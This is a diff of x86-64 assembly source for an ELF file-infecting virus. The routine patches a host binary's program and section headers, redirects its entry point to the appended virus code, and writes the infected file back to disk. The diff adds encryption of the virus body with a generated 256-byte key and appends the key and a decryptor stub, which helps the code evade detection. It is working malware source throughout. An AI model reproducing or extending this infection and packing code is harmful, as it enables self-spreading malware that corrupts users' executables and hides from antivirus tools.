@@ -1,6 +1,13 @@
 section .text
 	global _update_mmaped_file
 	extern _string
+	extern _final_end
+	extern _decrypt
+	extern _start
+	extern _end_decrypt
+	extern _o_entry
+	extern _encrypt_zone
+	extern _encrypted_part_start
 
 _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
 	enter 256, 0
@@ -20,6 +27,8 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	; rsp + 104 = 0
 	; rsp + 108 mmap_tmp addr
 	; rsp + 116 index mmap_tmp
+	; rsp + 124 set to 1 if infection worked, 0 else
+	; rsp + 132 key addr
 	;;;;;;;;;;;;;;;;;;;;;
 
 ; init phase
@@ -31,6 +40,7 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	mov QWORD [rsp + 16], rdx
 
 	mov QWORD [rsp + 24], r10
+	mov QWORD [rsp + 124], 0
 
 ; init phdr (ehdr + ehdr->e_phoff)
 	mov r10, QWORD [rsp] ; take the mmap_base_address
@@ -90,7 +100,7 @@ _if:
 	jl _else_if
 	mov r10, QWORD [rsp + 32] ; add PAGE_SIZE to segment offset
 	add r10, 8
-	add QWORD [r10], 4096
+	add QWORD [r10], 8192
 	jmp _inc_jmp_loop
 
 _else_if:
@@ -123,12 +133,18 @@ _else_if:
 	add r10, 16 ; p_filesz offset is 32, we already add 16, so 32 - 16 = 16
 	mov r12, QWORD [r10] ; take p_filesz value
 	add QWORD [r11], r12 ; add it to e_entry, so e_entry = p_vaddr + p_filesz
-	add QWORD [r11], 55 ; add the offset of the strings at the beginning of the virus
+	add QWORD [r11], 59 ; add the offset of the strings at the beginning of the virus
 ; update p_filesz and p_memsz
 	mov r10, QWORD [rsp + 32] ; take phdr
 	add r10, 32 ; p_filesz offset
 	mov r11, QWORD [rsp + 16] ; take virus size
 	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
+	lea rdi, [rel _decrypt]
+	lea rsi, [rel _end_decrypt]
+	add rsi, 2
+	sub rsi, rdi
+	add r11, 256 ; add key size
+	add r11, rsi ; add decrypt size
 	add QWORD [r10], r11 ; add virus_size to the segment size in file and in memory
 	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
 	add QWORD [r10], r11
@@ -170,6 +186,12 @@ _if_offset_equal_virus_offset:
 ; add virus size to this section size
 	mov r10, QWORD [rsp + 16] ; take virus size
 	add r10, 8 ; add the 8 bytes of o_entry
+	lea rdi, [rel _decrypt]
+	lea rsi, [rel _end_decrypt]
+	add rsi, 2
+	sub rsi, rdi
+	add r10, 256 ; add key size
+	add r10, rsi ; add decrypt size
 	add QWORD [r11], r10 ; add it to sh_size
 
 _if_offset_greater_or_equal_virus_offset:
@@ -182,7 +204,7 @@ _if_offset_greater_or_equal_virus_offset:
 ; add PAGE_SIZE to sh_offset
 	mov r10, QWORD [rsp + 40] ;take shdr
 	add r10, 24 ; go to sh_offset
-	add QWORD [r10], 4096 ; add pagesize
+	add QWORD [r10], 8192 ; add pagesize
 
 _inc_jmp_loop_sections:
 	inc QWORD [rsp + 48] ; inc shnum
@@ -193,14 +215,14 @@ _init_mmap_tmp:
 ; add PAGESIZE to sections offset
 	mov r10, QWORD [rsp] ; take mmap_base_addr
 	add r10, 40 ; go to sh_offset
-	add QWORD [r10], 4096 ; add pagesize
+	add QWORD [r10], 8192 ; add pagesize
 ;;;;;;;;;;;;;;;;;
 ; mmap tmp
 _mmap_tmp:
 	mov rax, 9
 	mov rdi, 0
 	mov rsi, QWORD [rsp + 8]
-	add rsi, 4096
+	add rsi, 8192
 	mov rdx, 3
 	mov r10, 34
 	mov r8, -1
@@ -223,25 +245,114 @@ _write_in_tmp_map:
 ;; memcpy(mmap_tmp + index, o_entry, 8);
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	mov rsi, rsp ; 
+	mov rsi, rsp ;
 	add rsi, 80
 	mov rcx, 8 ; size
 	cld
 	rep movsb
 	add QWORD [rsp + 116], 8 ; add 8 to our index
-;; memcpy(mmap_tmp + index, virus, virus_size);
+
+_copy_string:
+;; memcpy(mmap_tmp + index, _string, _string_len)
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _string]
-	mov rcx, QWORD [rsp + 16]
+	lea	rsi, [rel _string]
+	lea rcx, [rel _encrypted_part_start]
+	sub rcx, rsi
 	cld
 	rep movsb
-	mov r10, QWORD [rsp + 16]
-	add QWORD [rsp + 116], r10 ; add the virus size to our index
-; for i < 4096 - (virus_size + 8) memset(mmap_tmp, 0, 1);
-	mov QWORD [rsp + 88], 4096
+	lea	rsi, [rel _string]
+	lea rcx, [rel _encrypted_part_start]
+	sub rcx, rsi
+	add QWORD [rsp + 116], rcx
+
+_copy_encrypt_zone:
+;; encrypt_zone(virus, virus_size, mmap_tmp + index)
+	lea rdi, [rel _encrypted_part_start]
+	lea rsi, [rel _final_end]
+	add rsi, 2
+	sub rsi, rdi
+;	mov rsi, QWORD [rsp + 16]
+	mov rdx, QWORD [rsp + 108]
+	add rdx, QWORD [rsp + 116]
+	call _encrypt_zone
+	mov QWORD [rsp + 132], rax
+	lea rsi, [rel _final_end]
+	add rsi, 2
+	lea r10, [rel _encrypted_part_start]
+	sub rsi, r10
+	add QWORD [rsp + 116], rsi
+
+_copy_key:
+;; memcpy(mmap_tmp + index, key, 256)
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	mov rsi, QWORD [rsp + 132]
+	mov rcx, 256
+	cld
+	rep movsb
+	add QWORD [rsp + 116], 256
+
+_copy_depacker:
+;; memcpy(mmap_tmp + index, decrypt, decrypt_size)
+;	lea rax, [rel _o_entry]
+;	cmp QWORD [rax], 0
+;	je _write_decrypt
+;	mov rdi, QWORD [rsp + 108]
+;	add rdi, QWORD [rsp + 116]
+;	lea rsi, [rel _o_entry]
+;	sub rsi, 16
+;	mov rcx, rsi
+;	mov rsi, QWORD [rsi]
+;	add rcx, 8
+;	mov rcx, QWORD [rcx]
+;	cld
+;	rep movsb
+;	lea r10, [rel _o_entry]
+;	sub r10, 8
+;	mov r10, QWORD [r10]
+;	add QWORD [rsp + 116], r10
+;	jmp _complete
+
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	lea rsi, [rel _decrypt]
+	lea rcx, [rel _end_decrypt]
+	add rcx, 2
+	sub rcx, rsi
+	cld
+	rep movsb
+	lea rsi, [rel _decrypt]
+	lea rcx, [rel _end_decrypt]
+	add rcx, 2
+	sub rcx, rsi
+	add QWORD [rsp + 116], rcx
+
+;; memcpy(mmap_tmp + index, virus, virus_size);
+;	mov rdi, QWORD [rsp + 108]
+;	add rdi, QWORD [rsp + 116]
+;	lea rsi, [rel _string]
+;	mov rcx, QWORD [rsp + 16]
+;	cld
+;	rep movsb
+;	mov r10, QWORD [rsp + 16]
+;	add QWORD [rsp + 116], r10 ; add the virus size to our index
+
+
+_complete:
+; for i < 8192 - (virus_size + 8 + key_size(256) + decrypt_size) memset(mmap_tmp, 0, 1);
+	mov QWORD [rsp + 88], 8192
 	mov rdi, QWORD [rsp + 16]
 	add rdi, 8
+	add rdi, 256
+	lea r10, [rel _end_decrypt]
+	lea r11, [rel _decrypt]
+	add r10, 2
+	sub r10, r11
+;	lea r10, [rel _o_entry]
+;	sub r10, 8
+;	mov r10, QWORD [r10]
+	add rdi, r10
 	sub QWORD [rsp + 88], rdi
 	mov rcx, QWORD [rsp + 88]
 	mov rdi, QWORD [rsp + 108]
@@ -250,7 +361,7 @@ _write_in_tmp_map:
 	cld
 	rep stosb
 	mov r10, QWORD [rsp + 88]
-	add QWORD [rsp + 116], r10 ; add 4096 - (virus_size + 8) to our index
+	add QWORD [rsp + 116], r10 ; add 8192 - (virus_size + 8) to our index
 _last_write:
 ;; memcpy(mmap_tmp + index, mmap + virus_offset, file_size - virus_offset);
 	mov rdi, QWORD [rsp + 108] ; fd
@@ -263,21 +374,29 @@ _last_write:
 	rep movsb
 
 _write_into_file:
-;; write(fd, mmap_tmp, file_size + 4096)
+;; write(fd, mmap_tmp, file_size + 8192)
 	mov rax, 1
 	mov rdi, QWORD [rsp + 24]
 	mov rsi, QWORD [rsp + 108]
-	mov rdx, QWORD [rsp + 8] 
-	add rdx, 4096
+	mov rdx, QWORD [rsp + 8]
+	add rdx, 8192
+	syscall
+	mov QWORD [rsp + 124], 1
+
+_munmap_key:
+	mov rax, 11
+	mov rdi, QWORD [rsp + 132]
+	mov rsi, 256
 	syscall
 
 _munmap:
 	mov rax, 11
 	mov rdi, QWORD [rsp + 108]
 	mov rsi, QWORD [rsp + 8]
-	add rsi, 4096
+	add rsi, 8192
 	syscall
 
 _end:
+	mov rax, QWORD [rsp + 124]
 	leave
 	ret
